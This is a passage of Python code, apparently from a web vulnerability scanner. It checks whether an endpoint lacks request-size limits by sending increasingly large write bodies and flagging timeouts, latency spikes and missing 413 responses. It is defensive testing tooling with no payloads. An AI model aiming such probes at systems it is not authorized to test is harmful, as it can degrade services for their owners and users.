                findings.append({"size_kb": kb, "severity": "medium", "confidence": "potential",
                                 "proof": f"A {kb}KB write body caused a timeout/error — potential resource exhaustion at scale (verify manually, non-destructively)."})
                break

            if r.status_code == 413:
                limit_enforced = True
                break

            # Degradation signal: latency balloons disproportionately with size.
            if dt > max(1500.0, base_ms * 6) and dt > 800:
                findings.append({"size_kb": kb, "severity": "medium", "confidence": "potential",
                                 "proof": f"Latency {base_ms:.0f}ms → {dt:.0f}ms on a {kb}KB body — potential resource-exhaustion / no input-size cap."})
                break

            # State change despite error (his insight): created on an error path?
            loc = r.headers.get("location", "")
            if r.status_code >= 400 and (loc or '"id"' in (r.text or "")[:600]):
                findings.append({"size_kb": kb, "severity": "low", "confidence": "potential",
                                 "proof": f"Oversized {kb}KB write returned {r.status_code} yet a resource looks created (Location/id present) — inconsistent error handling."})

            if r.status_code < 500:
                largest_ok = kb

        # Only a genuinely large accepted body (aggressive mode) is evidence of an
        # *unbounded* limit — accepting 512KB is normal and would be noise.
        if not limit_enforced and not findings and largest_ok >= 2048:
            findings.append({"size_kb": largest_ok, "severity": "low", "confidence": "potential",
                             "proof": f"Server accepted a {largest_ok}KB body ({method}) with no 413 size limit — no effective request-size cap (resource-exhaustion surface)."})

    note = ("Resource-exhaustion / unbounded-input — NON-DESTRUCTIVE bounded check"
            f" (max {max_kb}KB, aggressive={'on' if aggressive else 'off, set KRYX_RESOURCE_AGGRESSIVE=1'}).")
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "baseline_status": base_status, "note": note}
